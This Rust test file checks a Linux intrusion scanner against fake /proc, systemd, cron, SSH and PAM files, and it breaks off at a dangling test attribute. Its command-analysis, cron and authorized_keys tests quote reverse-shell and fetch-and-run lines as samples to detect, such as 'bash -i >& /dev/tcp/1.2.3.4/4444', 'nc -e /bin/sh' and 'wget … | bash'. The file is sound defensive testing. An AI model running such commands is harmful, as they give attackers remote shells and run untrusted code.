//! Integration tests with made-up /proc, /etc and systemd files in a
//! temporary directory (tempfile). Nothing on the real system is read or changed.

use scanner::baseline::{self, Baseline};
use scanner::config::{glob_match, Config};
use scanner::external_tools::{parse_chkrootkit, parse_debsums, parse_lynis, parse_rkhunter};
use scanner::modules::common::analyze_command;
use scanner::modules::net_proc::{encode_hex_addr, parse_hex_addr, parse_proc_net, parse_sched_debug, parse_ss_listeners, Proto};
use scanner::modules::persistence::{parse_authorized_key, parse_cron_line, parse_pam_line, parse_unit};
use scanner::modules::{fs_perms, proc_audit, Collector, ScanCtx};
use scanner::procinfo::{parse_stat, read_proc, snapshot};
use scanner::sandbox;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::net::SocketAddr;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn opts(modules: &[ModuleId]) -> ScanOptions {
    ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() }
}

// ------------------------------------------------------------ /proc/net/tcp

#[test]
fn hex_addresses_round_trip_ipv4_and_ipv6() {
    for s in ["127.0.0.1:53", "10.0.0.5:4444", "0.0.0.0:0", "[::1]:631", "[2001:db8::42]:443", "[::ffff:192.0.2.1]:22"] {
        let a: SocketAddr = s.parse().expect("address");
        let v6 = matches!(a, SocketAddr::V6(_));
        assert_eq!(parse_hex_addr(&encode_hex_addr(&a), v6).expect("parse"), a, "{s}");
    }
}

#[test]
fn parses_kernel_style_proc_net_tcp() {
    // This is what loopback DNS looks like in a real /proc/net/tcp on x86_64 (little endian)
    let text = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n\
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   991        0 21345 1 0000000000000000 100 0 0 10 5\n\
   1: 0500000A:A8CA 42710FCB:115C 01 00000000:00000000 02:000A7D9A 00000000  1000        0 99887 2 0000000000000000 20 4 30 10 -1\n\
   2: broken line\n";
    let (entries, bad) = parse_proc_net(text, Proto::Tcp);
    assert_eq!(bad, 1, "the broken line should be counted, not crash");
    assert_eq!(entries.len(), 2);
    assert_eq!(entries[0].local.to_string(), "127.0.0.53:53");
    assert!(entries[0].is_listening());
    assert_eq!(entries[0].uid, 991);
    assert_eq!(entries[1].local.to_string(), "10.0.0.5:43210");
    assert_eq!(entries[1].remote.to_string(), "203.15.113.66:4444");
    assert_eq!(entries[1].remote.port(), 4444);
    assert!(entries[1].is_established());
    assert_eq!(entries[1].inode, 99887);
}

#[test]
fn parses_ipv6_listener() {
    let text = "header\n   0: 00000000000000000000000000000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1234 1 0 100 0 0 10 0\n";
    let (e, bad) = parse_proc_net(text, Proto::Tcp6);
    assert_eq!(bad, 0);
    assert_eq!(e[0].local.to_string(), "[::]:22");
}

#[test]
fn parses_sched_debug_and_ss() {
    let sched = "cpu#0\nrunnable tasks:\n S task PID tree-key switches prio\n------\n S   systemd     1   1234.567  5000  120  0.0  1.0\n>R   my prog   4101   22.5   3  120  0.0  1.0\n";
    let pids = parse_sched_debug(sched);
    assert!(pids.contains(&1) && pids.contains(&4101), "{pids:?}");
    let ss = "tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*\nudp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*\n";
    let set = parse_ss_listeners(ss);
    assert!(set.contains(&("tcp".into(), 22)) && set.contains(&("udp".into(), 53)));
}

// ------------------------------------------------------------ processes

#[test]
fn stat_with_spaces_and_parens_in_name() {
    let (comm, state, ppid, flags) = parse_stat("4242 (evil (x) name) S 1 4242 4242 0 -1 2097152 0 0").expect("stat");
    assert_eq!(comm, "evil (x) name");
    assert_eq!(state, 'S');
    assert_eq!(ppid, 1);
    assert_eq!(flags, 0x0020_0000);
}

#[test]
fn detects_deleted_binary_and_tmp_exe() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/77/stat", "77 (x) S 1 77 77 0 -1 0 0 0\n");
    write(root, "/proc/77/status", "Name:\tx\nTgid:\t77\nPPid:\t1\nUid:\t0\t0\t0\t0\n");
    write(root, "/proc/77/cmdline", "/tmp/x\0");
    symlink("/tmp/x (deleted)", root.join("proc/77/exe")).expect("symlink");
    fs::create_dir_all(root.join("proc/77/fd")).expect("fd");
    symlink("socket:[555]", root.join("proc/77/fd/3")).expect("fd link");

    let sys = SysRoot::new(root);
    let p = read_proc(&sys, 77).expect("process");
    assert!(p.exe_deleted());
    assert_eq!(p.exe_path(), Some("/tmp/x"));
    assert_eq!(p.socket_fds, vec![(3, 555)]);

    let cfg = Config::default();
    let procs = snapshot(&sys);
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &procs };
    let mut col = Collector::default();
    proc_audit::run(&ctx, &mut col);
    let rules: Vec<&str> = col.findings.iter().map(|f| f.rule.as_str()).collect();
    assert!(rules.contains(&"PROC-DELETED"), "{rules:?}");
    assert!(rules.contains(&"PROC-TMP-EXE"), "{rules:?}");
    let deleted = col.findings.iter().find(|f| f.rule == "PROC-DELETED").expect("finding");
    assert_eq!(deleted.severity, Severity::High);
}

#[test]
fn missing_proc_files_never_panic() {
    let dir = tempfile::tempdir().expect("tempdir");
    // A completely empty root: no /proc files at all
    let sys = SysRoot::new(dir.path());
    let report = run_scan(&sys, &Config::default(), &ScanOptions::default(), &|_| {});
    assert!(report.notes.iter().any(|n| n.contains("/proc/net/tcp")), "{:?}", report.notes);
    assert_eq!(report.summary.critical, 0);
}

// ------------------------------------------------------------ SUID and baseline

#[test]
fn suid_diff_flags_new_file_as_critical() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/usr/bin/passwd", "x");
    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");

    let sys = SysRoot::new(root);
    let cfg = Config::default();
    let first = run_scan(&sys, &cfg, &opts(&[ModuleId::FsPerms]), &|_| {});
    assert_eq!(first.inventory.suid.len(), 1);
    assert!(first.findings.iter().all(|f| f.severity < Severity::Critical));
    let base_path = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&base_path).expect("save");

    // new SUID file and changed content in the old one
    write(root, "/usr/local/bin/backdoor", "y");
    fs::set_permissions(root.join("usr/local/bin/backdoor"), fs::Permissions::from_mode(0o4755)).expect("chmod");
    write(root, "/usr/bin/passwd", "changed");
    fs::set_permissions(root.join("usr/bin/passwd"), fs::Permissions::from_mode(0o4755)).expect("chmod");

    let o = ScanOptions { baseline_compare: Some(base_path), ..opts(&[ModuleId::FsPerms]) };
    let second = run_scan(&sys, &cfg, &o, &|_| {});
    let new = second.findings.iter().find(|f| f.rule == "BASE-SUID-NEW").expect("new SUID file");
    assert_eq!(new.severity, Severity::Critical);
    assert!(new.title.contains("/usr/local/bin/backdoor"));
    assert!(second.has_rule("BASE-SUID-CHANGED"));
    assert_eq!(second.findings[0].severity, Severity::Critical, "the report should be sorted with Critical first");
}

#[test]
fn baseline_compare_skips_modules_not_scanned() {
    let b = Baseline {
        format_version: 1,
        created_at: "then".into(),
        hostname: "h".into(),
        kernel: "k".into(),
        os: "o".into(),
        scanner_version: "0".into(),
        modules: vec!["persistence".into()],
        suid: vec![],
        listeners: vec![],
        persistence_files: Default::default(),
    };
    let (f, notes) = baseline::compare(&b, &Default::default(), &["fs_perms".to_string()]);
    assert!(f.is_empty());
    assert!(notes.iter().any(|n| n.contains("SUID")));
}

#[test]
fn fs_walk_skips_virtual_paths() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/1/fake", "x");
    fs::set_permissions(root.join("proc/1/fake"), fs::Permissions::from_mode(0o4755)).expect("chmod");
    let sys = SysRoot::new(root);
    let cfg = Config::default();
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
    let mut col = Collector::default();
    fs_perms::run(&ctx, &mut col);
    assert!(col.inventory.suid.is_empty(), "/proc should be skipped");
}

// ------------------------------------------------------------ systemd, cron, ssh, pam

#[test]
fn systemd_unit_with_tmp_exec_is_flagged() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/systemd/system/dummy.service", "[Service]\nExecStart=-/dev/shm/.x \\\n  --daemon\n");
    symlink("../dummy.service", {
        fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).expect("mkdir");
        root.join("etc/systemd/system/multi-user.target.wants/dummy.service")
    })
    .expect("symlink");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Persistence]), &|_| {});
    let f = report.findings.iter().find(|f| f.rule == "PERS-SYSTEMD-EXEC").expect("finding");
    assert_eq!(f.severity, Severity::Critical);
    assert!(f.evidence.contains("enabled"));
    assert!(report.inventory.units.iter().any(|u| u.name == "dummy.service" && u.enabled));
}

#[test]
fn unit_parser_handles_continuations() {
    let e = parse_unit("[Service]\n# kommentar\nExecStart=/bin/echo a \\\n  b\nUser=nobody\n");
    assert_eq!(e[0], ("Service".into(), "ExecStart".into(), "/bin/echo a    b".into()));
    assert_eq!(e[1].1, "User");
}

#[test]
fn cron_lines() {
    assert_eq!(parse_cron_line("MAILTO=root", true), None);
    let (s, u, c) = parse_cron_line("*/5 * * * * root curl x | sh", true).expect("line");
    assert_eq!((s.as_str(), u.as_deref(), c.as_str()), ("*/5 * * * *", Some("root"), "curl x | sh"));
    let (s, u, c) = parse_cron_line("@reboot /home/a/.x", false).expect("line");
    assert_eq!((s.as_str(), u, c.as_str()), ("@reboot", None, "/home/a/.x"));
}

#[test]
fn command_analysis() {
    let cfg = Config::default();
    let sev = |c: &str| analyze_command(c, &cfg).iter().map(|i| i.severity).max();
    assert_eq!(sev("/usr/sbin/sshd -D"), None);
    assert_eq!(sev("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"), Some(Severity::Critical));
    assert_eq!(sev("echo aGk= | base64 -d | sh"), Some(Severity::Critical));
    assert_eq!(sev("wget -qO- http://x/y | bash"), Some(Severity::Critical));
    assert_eq!(sev("/tmp/update.sh"), Some(Severity::High));
    assert_eq!(sev("python3 -c 'import socket,pty;s=socket.socket()'"), Some(Severity::Critical));
}

#[test]
fn authorized_keys_options_and_comment() {
    let k = parse_authorized_key("command=\"nc -e /bin/sh 1.2.3.4 1\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl").expect("key");
    assert_eq!(k.option("command"), Some("nc -e /bin/sh 1.2.3.4 1"));
    assert!(k.has_option("no-pty"));
    assert_eq!(k.comment, "");
    assert!(k.fingerprint().expect("fingerprint").starts_with("SHA256:"));
    let k2 = parse_authorized_key("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl anna@laptop").expect("key");
    assert_eq!(k2.comment, "anna@laptop");
    assert!(parse_authorized_key("# kommentar").is_none());
}

#[test]
fn pam_lines() {
    let (t, c, m, a) = parse_pam_line("auth\t[success=1 default=ignore]\tpam_unix.so nullok").expect("line");
    assert_eq!((t.as_str(), c.as_str(), m.as_str()), ("auth", "[success=1 default=ignore]", "pam_unix.so"));
    assert_eq!(a, vec!["nullok".to_string()]);
    assert!(parse_pam_line("@include common-auth").is_none());
}

#[test]
fn whitelist_glob_and_toml_round_trip() {
    assert!(glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/app/chrome-sandbox"));
    assert!(!glob_match("/usr/lib/*/chrome-sandbox", "/usr/lib/a/b/chrome-sandbox"));
    let cfg = Config::default();
    let text = cfg.to_toml().expect("toml");
    let back: Config = toml::from_str(&text).expect("parse");
    assert_eq!(back, cfg);
    let partial: Config = toml::from_str("allowed_listen_ports = [\"tcp/8080\"]").expect("partial");
    assert!(partial.is_listen_allowed("tcp", 8080));
    assert!(!partial.allowed_suid.is_empty(), "missing fields should get default values");
}

// ------------------------------------------------------------ external tools

#[test]
fn debsums_and_friends_parse() {
    let f = parse_debsums("/usr/bin/ls\n/usr/share/doc/x/README\n", "debsums: missing file /usr/share/man/man1/a.1.gz (from a package)\n");
    assert_eq!(f.len(), 3);
    assert_eq!(f[0].severity, Severity::Critical);
    assert_eq!(f[1].severity, Severity::Low);
    assert_eq!(f[2].rule, "EXT-DEBSUMS-MISSING");
    assert_eq!(parse_chkrootkit("Checking `ls'... INFECTED\n")[0].severity, Severity::Critical);
    assert_eq!(parse_rkhunter("Warning: The file properties have changed:\n         File: /usr/bin/ls\n").len(), 1);
    assert_eq!(parse_lynis("", "warning[]=SSH-7408|Root login|\nsuggestion[]=X|y|\n").len(), 2);
}

#[test]
fn known_debian_false_alarms_are_low() {
    // Lines from a real root scan on Debian 13
    let rk = parse_rkhunter("Warning: Hidden file found: /etc/.updated: ASCII text\nWarning: The command '/usr/bin/lwp-request' has been replaced by a script: /usr/bin/lwp-request: Perl script text executable\n");
    assert_eq!(rk.len(), 2);
    assert!(rk.iter().all(|f| f.severity == Severity::Low && f.rule == "EXT-RKHUNTER-KNOWN"), "{rk:?}");
    let ck = parse_chkrootkit("WARNING: Output from ifpromisc:\nwlp2s0: PACKET SNIFFER(/usr/sbin/NetworkManager[1044], /usr/sbin/wpa_supplicant[1049])\nWARNING: output from chkwtmp:\n1 deletion(s) between Fri Nov  6 08:53:56 2026 and Fri Nov  6 08:55:52 2026\n");
    assert_eq!(ck.len(), 1);
    assert!(!ck[0].evidence.contains("SNIFFER"), "{}", ck[0].evidence);
    assert!(ck[0].evidence.contains("chkwtmp"));
}

#[test]
fn nfs_callback_listener_is_low_and_shared_socket_reported_once() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    write(
        root,
        "/proc/net/tcp",
        &format!(
            "{hdr}   0: 00000000:A873 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 23931 1 0 100 0 0 10 0\n   1: 00000000:006F 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 16439 1 0 100 0 0 10 0\n"
        ),
    );
    write(root, "/proc/mounts", "fileserver:/export/data /mnt/data nfs4 rw,vers=4.0 0 0\n");
    // the kernel thread [NFSv4 callback]
    write(root, "/proc/3243/stat", "3243 (NFSv4 callback) S 2 0 0 0 -1 2129984 0 0\n");
    write(root, "/proc/3243/status", "Name:\tNFSv4 callback\nTgid:\t3243\nPPid:\t2\nUid:\t0\t0\t0\t0\n");
    // systemd (PID 1) and rpcbind share port 111 through socket activation
    for (pid, comm, exe, uid) in [(1u32, "systemd", "/usr/lib/systemd/systemd", 0u32), (885, "rpcbind", "/usr/sbin/rpcbind", 113)] {
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} ({comm}) S 1 0 0 0 -1 4194560 0 0\n"));
        write(root, &format!("/proc/{pid}/status"), &format!("Name:\t{comm}\nTgid:\t{pid}\nPPid:\t1\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n"));
        write(root, &format!("/proc/{pid}/cmdline"), &format!("{exe}\0"));
        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("exe");
        fs::create_dir_all(root.join(format!("proc/{pid}/fd"))).expect("fd");
        symlink("socket:[16439]", root.join(format!("proc/{pid}/fd/5"))).expect("sock");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    let orphan = report.findings.iter().find(|f| f.rule == "NET-ORPHAN-LISTEN").expect("orphan");
    assert_eq!(orphan.severity, Severity::Low, "{}", orphan.description);
    let p111: Vec<_> = report.findings.iter().filter(|f| f.rule == "NET-LISTEN-UNKNOWN").collect();
    assert_eq!(p111.len(), 1, "{p111:?}");
    assert!(p111[0].title.contains("rpcbind"), "{}", p111[0].title);
}

#[test]
fn whitelist_port_ranges_trusted_processes_and_hidden_findings() {
    let cfg = Config::default();
    assert!(cfg.is_listen_allowed("udp", 1716), "KDE Connect range");
    assert!(cfg.is_listen_allowed("tcp", 1764));
    assert!(!cfg.is_listen_allowed("tcp", 1765));
    assert!(!cfg.is_listen_allowed("udp", 22));
    assert!(cfg.is_listen_process_allowed("avahi-daemon", Some("/usr/sbin/avahi-daemon")));
    assert!(!cfg.is_listen_process_allowed("avahi-daemon", Some("/tmp/avahi-daemon")), "a copy outside /usr is not trusted");
    assert!(!cfg.is_listen_process_allowed("rpcbind", Some("/usr/sbin/rpcbind")), "rpcbind exposure is still reported");

    let f = scanner::Finding::new(Severity::Low, "persistence", "PERS-SYSTEMD-LOCAL", "Locally created systemd unit: x.service");
    let mut hidden = Config::default();
    assert!(!hidden.suppresses(&f));
    hidden.ignore_findings.push(Config::finding_key(&f));
    assert!(hidden.suppresses(&f));
    let back: Config = toml::from_str(&hidden.to_toml().expect("toml")).expect("parse");
    assert!(back.suppresses(&f), "hidden findings survive saving and loading");
}

#[test]
fn verdict_follows_the_worst_finding() {
    use scanner::report::{Report, VerdictLevel};
    let mut r = Report { running_as_root: true, scan_root: "/".into(), ..Report::default() };
    r.finalize();
    assert_eq!(r.verdict().level, VerdictLevel::Clean);
    r.findings.push(scanner::Finding::new(Severity::Medium, "m", "X", "t"));
    r.finalize();
    assert_eq!(r.verdict().level, VerdictLevel::Minor);
    r.findings.push(scanner::Finding::new(Severity::Critical, "m", "Y", "t"));
    r.finalize();
    let v = r.verdict();
    assert_eq!(v.level, VerdictLevel::Alarm);
    assert!(r.to_text(false).contains("VERDICT:"));
    let html = r.to_html();
    assert!(html.starts_with("<!doctype html>") && !html.contains("<script"));
    let line = r.summary_line();
    assert!(line.starts_with("ALARM ") && !line.contains('\n') && line.contains("1 critical"), "{line}");
}

#[test]
fn commands_that_need_root_get_sudo() {
    use scanner::finding::sudoize;
    assert_eq!(sudoize("lynis show details PKGS-7392"), "sudo lynis show details PKGS-7392");
    assert_eq!(sudoize("ls -l /proc/12/exe /proc/12/cwd"), "sudo ls -l /proc/12/exe /proc/12/cwd");
    assert_eq!(sudoize("ss -tulpn | grep ':111 '"), "sudo ss -tulpn | grep ':111 '");
    assert_eq!(sudoize("cat /sys/module/x; rpcinfo -p"), "cat /sys/module/x; rpcinfo -p");
    assert_eq!(sudoize("cat /sys/module/x; chkrootkit chkwtmp"), "cat /sys/module/x; sudo chkrootkit chkwtmp");
    assert_eq!(sudoize("echo x | sudo tee /etc/f"), "echo x | sudo tee /etc/f", "already sudo");
    assert_eq!(sudoize("dpkg -S /usr/bin/ls"), "dpkg -S /usr/bin/ls");
}

#[test]
fn lynis_warnings_explain_and_use_sudo() {
    let f = parse_lynis("", "warning[]=PKGS-7392|Found one or more vulnerable packages.|\n");
    assert_eq!(f[0].verify[0], "sudo lynis show details PKGS-7392");
    assert!(f[0].description.contains("updates"), "{}", f[0].description);
}

#[test]
fn rkhunter_dev_shm_and_permitrootlogin_are_known() {
    let out = "Warning: Suspicious file types found in /dev:\n         /dev/shm/lsp-catalog-malte.shm: data\n         /dev/shm/lsp-catalog-malte.lock: data\nWarning: The SSH configuration option 'PermitRootLogin' has not been set.\n         The default value may be 'yes', to allow root access.\nWarning: Something really odd in /dev/shm/x\n";
    let f = parse_rkhunter(out);
    assert_eq!(f.len(), 3);
    assert_eq!(f[0].rule, "EXT-RKHUNTER-KNOWN");
    assert!(f[0].verify.last().expect("fix").contains("ALLOWDEVFILE=/dev/shm/lsp-catalog-malte.shm"), "{:?}", f[0].verify);
    assert_eq!(f[1].rule, "EXT-RKHUNTER-KNOWN");
    assert_eq!(f[2].rule, "EXT-RKHUNTER-WARN");
}

#[test]
fn chkrootkit_wtmp_gap_is_low() {
    let f = parse_chkrootkit("WARNING: output from chkwtmp:\n1 deletion(s) between Fri Nov  6 08:53:56 2026 and Fri Nov  6 08:55:52 2026\n");
    assert_eq!(f.len(), 1);
    assert_eq!(f[0].rule, "EXT-CHKROOTKIT-WTMP");
    assert_eq!(f[0].severity, Severity::Low);
}

#[test]
fn parses_apt_simulation_and_marks_security_updates() {
    use scanner::modules::updates::parse_apt_simulation;
    let out = "Reading package lists...\nInst libssl3t64 [3.5.1-1] (3.5.1-1+deb13u1 Debian-Security:13/stable-security [amd64])\nInst htop [3.4.0-1] (3.4.1-1 Debian:13.1/stable [amd64])\nInst newdep (1.0 Debian:13.1/stable [amd64])\nConf libssl3t64 (3.5.1-1+deb13u1 Debian-Security:13/stable-security [amd64])\n";
    let p = parse_apt_simulation(out);
    assert_eq!(p.len(), 3);
    assert!(p[0].security && !p[1].security);
    assert_eq!(p[0].old.as_deref(), Some("3.5.1-1"));
    assert_eq!(p[0].new, "3.5.1-1+deb13u1");
    assert_eq!(p[2].old, None);
}

#[test]
fn automatic_baseline_is_saved_once_and_not_on_a_dirty_scan() {
    use scanner::autobaseline::{auto_save_to, AutoBaseline};
    use scanner::report::Report;
    let dir = tempfile::tempdir().expect("tempdir");
    let target = dir.path().join("state/baseline.json");
    let mut r = Report {
        running_as_root: true,
        scan_root: "/".into(),
        modules: ModuleId::CORE.iter().map(|m| m.id().to_string()).collect(),
        ..Report::default()
    };
    r.finalize();

    // not root → nothing saved, with a reason
    let mut user = r.clone();
    user.running_as_root = false;
    assert!(matches!(auto_save_to(&user, &target), AutoBaseline::Skipped(_)));
    // incomplete scan
    let mut partial = r.clone();
    partial.modules.pop();
    assert!(matches!(auto_save_to(&partial, &target), AutoBaseline::Skipped(_)));
    // serious findings → no baseline of a possibly compromised system
    let mut dirty = r.clone();
    dirty.findings.push(scanner::Finding::new(Severity::Critical, "m", "X", "t"));
    dirty.finalize();
    assert!(matches!(auto_save_to(&dirty, &target), AutoBaseline::Skipped(_)));
    assert!(!target.exists());
    // clean, complete, root → saved; a second time nothing is needed
    assert_eq!(auto_save_to(&r, &target), AutoBaseline::Saved(target.clone()));
    assert!(Baseline::load(&target).is_ok());
    assert_eq!(auto_save_to(&r, &target), AutoBaseline::NotNeeded);
}

#[test]
fn baseline_changes_after_package_updates_are_softened() {
    use std::time::{Duration, SystemTime};
    let mut f = vec![
        scanner::Finding::new(Severity::Critical, "baseline", "BASE-SUID-CHANGED", "t"),
        scanner::Finding::new(Severity::Critical, "baseline", "BASE-SUID-NEW", "t"),
    ];
    let created = "2026-01-01 00:00:00 +0000";
    scanner::autobaseline::soften_after_updates(&mut f, created, Some(SystemTime::UNIX_EPOCH + Duration::from_secs(1_900_000_000)));
    assert_eq!(f[0].severity, Severity::Medium, "update changed the file");
    assert_eq!(f[1].severity, Severity::Critical, "a new SUID file stays critical");
    let mut g = vec![scanner::Finding::new(Severity::Critical, "baseline", "BASE-SUID-CHANGED", "t")];
    scanner::autobaseline::soften_after_updates(&mut g, created, Some(SystemTime::UNIX_EPOCH));
    assert_eq!(g[0].severity, Severity::Critical, "no package activity after the baseline");
}

#[test]
fn many_ports_of_one_program_become_one_finding() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let hdr = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n";
    let line = |i: u32, port: u16, inode: u32| format!("   {i}: 00000000:{port:04X} 00000000:0000 0A 00000000:00000000 00:00000000 00000000   113        0 {inode} 1 0 100 0 0 10 0\n");
    write(root, "/proc/net/tcp", &format!("{hdr}{}{}{}", line(0, 53489, 701), line(1, 53711, 702), line(2, 40000, 703)));
    write(root, "/proc/1965/stat", "1965 (rpc.statd) S 1 0 0 0 -1 4194560 0 0\n");
    write(root, "/proc/1965/status", "Name:\trpc.statd\nTgid:\t1965\nPPid:\t1\nUid:\t113\t113\t113\t113\n");
    write(root, "/proc/1965/cmdline", "/usr/sbin/rpc.statd\0");
    symlink("/usr/sbin/rpc.statd", root.join("proc/1965/exe")).expect("exe");
    fs::create_dir_all(root.join("proc/1965/fd")).expect("fd");
    for (n, inode) in [(5, 701), (6, 702), (7, 703)] {
        symlink(format!("socket:[{inode}]"), root.join(format!("proc/1965/fd/{n}"))).expect("sock");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::NetProc]), &|_| {});
    let f: Vec<_> = report.findings.iter().filter(|f| f.rule == "NET-LISTEN-UNKNOWN").collect();
    assert_eq!(f.len(), 1, "{f:?}");
    assert!(f[0].title.contains("tcp/40000") && f[0].title.contains("tcp/53711") && f[0].title.contains("(rpc.statd)"), "{}", f[0].title);
    assert!(f[0].description.contains("NFS"), "{}", f[0].description);
    assert_eq!(f[0].evidence.matches("socket:").count(), 3);
}

#[test]
fn random_ports_of_a_known_program_are_not_new_listeners() {
    use scanner::baseline::ListenerKey;
    use scanner::modules::net_proc::Connection;
    let key = |proto: &str, port: u16, process: &str| ListenerKey { proto: proto.into(), port, process: process.into() };
    let conn = |proto: &str, port: u16, process: &str| Connection {
        proto: proto.into(),
        local_addr: "0.0.0.0".into(),
        local_port: port,
        remote_addr: "0.0.0.0".into(),
        remote_port: 0,
        state: "UNCONN".into(),
        listening: true,
        uid: 1000,
        inode: 1,
        pid: Some(1),
        process: Some(process.into()),
        cmdline: None,
        exe: None,
    };
    let base = Baseline {
        format_version: 1,
        created_at: "then".into(),
        hostname: "h".into(),
        kernel: "k".into(),
        os: "o".into(),
        scanner_version: "0".into(),
        modules: vec!["net_proc".into()],
        suid: vec![],
        listeners: vec![key("udp", 1716, "kdeconnectd"), key("udp", 40000, "kdeconnectd")],
        persistence_files: Default::default(),
    };
    let mut inv = scanner::modules::Inventory::default();
    for p in [35622, 37707, 45314] {
        inv.connections.push(conn("udp", p, "kdeconnectd"));
    }
    let (f, _) = baseline::compare(&base, &inv, &["net_proc".to_string()]);
    assert!(f.is_empty(), "random ports of a known program: {f:?}");
    // a fixed low port, or a program that was not there, is still news – one finding per program
    inv.connections.push(conn("tcp", 4444, "mystery"));
    inv.connections.push(conn("tcp", 50000, "mystery"));
    let (f, _) = baseline::compare(&base, &inv, &["net_proc".to_string()]);
    assert_eq!(f.len(), 1);
    assert_eq!(f[0].severity, Severity::High);
    assert!(f[0].title.contains("tcp/4444") && f[0].title.contains("tcp/50000"), "{}", f[0].title);
}

#[test]
fn an_incomplete_baseline_is_completed_after_a_clean_root_scan() {
    use scanner::autobaseline::{auto_save_to, AutoBaseline};
    use scanner::report::Report;
    let dir = tempfile::tempdir().expect("tempdir");
    let path = dir.path().join("baseline.json");
    let mut quick = Report { running_as_root: true, scan_root: "/".into(), modules: vec!["net_proc".into(), "persistence".into()], ..Report::default() };
    quick.finalize();
    Baseline::from_report(&quick).save(&path).expect("save");
    let mut full = Report { running_as_root: true, scan_root: "/".into(), modules: ModuleId::CORE.iter().map(|m| m.id().to_string()).collect(), ..Report::default() };
    full.finalize();
    match auto_save_to(&full, &path) {
        AutoBaseline::Completed(_, parts) => assert_eq!(parts, vec!["proc_audit".to_string(), "fs_perms".to_string()]),
        other => panic!("{other:?}"),
    }
    assert!(Baseline::load(&path).expect("load").modules.iter().any(|m| m == "fs_perms"));
    assert_eq!(auto_save_to(&full, &path), AutoBaseline::NotNeeded, "complete now");
}

#[test]
fn several_updated_programs_become_one_restart_finding() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    for (pid, exe) in [(300u32, "/usr/libexec/flatpak-session-helper"), (301, "/usr/bin/firefox-esr"), (302, "/home/x/payload")] {
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} (x) S 1 0 0 0 -1 4194560 0 0\n"));
        write(root, &format!("/proc/{pid}/status"), &format!("Name:\tx\nTgid:\t{pid}\nPPid:\t1\nUid:\t1000\t1000\t1000\t1000\n"));
        write(root, &format!("/proc/{pid}/cmdline"), &format!("{exe}\0"));
        symlink(format!("{exe} (deleted)"), root.join(format!("proc/{pid}/exe"))).expect("exe");
    }
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::ProcAudit]), &|_| {});
    let deleted: Vec<_> = report.findings.iter().filter(|f| f.rule == "PROC-DELETED").collect();
    assert_eq!(deleted.len(), 2, "{deleted:?}");
    let grouped = deleted.iter().find(|f| f.title.contains("need a restart")).expect("grouped");
    assert!(grouped.title.contains("flatpak-session-helper") && grouped.title.contains("firefox-esr"), "{}", grouped.title);
    assert!(deleted.iter().any(|f| f.title.contains("/home/x/payload")));
}

#[test]
fn library_path_in_tmp_is_flagged_but_normal_ones_are_not() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/ld.so.conf", "include /etc/ld.so.conf.d/*.conf\n");
    write(root, "/etc/ld.so.conf.d/x86_64-linux-gnu.conf", "# Multiarch\n/usr/local/lib/x86_64-linux-gnu\n/lib/x86_64-linux-gnu\n");
    write(root, "/etc/ld.so.conf.d/zz.conf", "/dev/shm/.lib\n");
    let report = run_scan(&SysRoot::new(root), &Config::default(), &opts(&[ModuleId::Persistence]), &|_| {});
    let f: Vec<_> = report.findings.iter().filter(|f| f.rule == "PERS-LDCONF").collect();
    assert_eq!(f.len(), 1, "{f:?}");
    assert_eq!(f[0].severity, Severity::High);
    assert!(f[0].evidence.contains("zz.conf:1: /dev/shm/.lib"));
}

#[test]
fn updates_module_is_skipped_for_a_test_root() {
    let dir = tempfile::tempdir().expect("tempdir");
    let report = run_scan(&SysRoot::new(dir.path()), &Config::default(), &opts(&[ModuleId::Updates]), &|_| {});
    assert!(report.notes.iter().any(|n| n.contains("updates")), "{:?}", report.notes);
    assert!(report.findings.is_empty());
}

#[test]
